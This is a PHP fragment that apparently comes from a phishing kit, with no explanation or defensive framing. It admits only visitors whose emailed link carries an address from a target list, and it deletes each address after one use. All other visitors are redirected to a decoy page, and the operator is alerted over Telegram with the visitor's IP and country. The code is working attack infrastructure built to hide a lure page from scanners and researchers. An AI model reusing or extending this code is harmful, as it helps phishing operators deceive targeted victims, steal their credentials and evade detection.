<?php
$getemail = $_GET['data'];
$mylist = file_get_contents($email_list);
if (!isset($_GET['data']) || empty($_GET['data'])) {
    $info_01 = $respo->geoplugin_request . ' from ' . $respo->geoplugin_countryName . ' blocked!, email was not passed ';
    if ($full_notification) {
        teleg($info_01);
    }
    header('Location: ' . faker());
    exit();
}
if (!filter_var($getemail, FILTER_VALIDATE_EMAIL)) {
    $info_02 = $respo->geoplugin_request . ' from ' . $respo->geoplugin_countryName . ' blocked!, passed email was invalid';
    if ($full_notification) {
        teleg($info_02);
    }
    header('Location: ' . faker());
    exit();
}
if (!preg_match("#\b{$getemail}\b#", $mylist)) {
    $info_03 = $respo->geoplugin_request . ' from ' . $respo->geoplugin_countryName . ' blocked!, email not in allowed list';
    if ($full_notification) {
        teleg($info_03);
    }
    header('Location: ' . faker());
    exit();
}
$e_content = file_get_contents($email_list);
$e_content = str_replace($getemail, '', $e_content);
file_put_contents($email_list, $e_content); ?>